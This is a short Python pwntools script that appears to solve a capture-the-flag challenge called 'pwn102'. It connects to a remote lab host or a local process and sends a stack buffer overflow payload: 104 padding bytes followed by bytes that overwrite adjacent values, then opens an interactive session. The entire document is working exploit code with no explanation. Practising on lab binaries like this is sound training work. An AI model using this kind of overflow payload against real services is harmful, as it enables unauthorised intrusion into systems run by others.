from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.213.78', 9002)
    else:
        r = process('./pwn102.pwn102')  
    payload = b'a'* 104 + b'\xd3\xc0\x00\x00\x33\xff\xc0\x00'
    r.sendline(payload)
    r.interactive()

exploit(True)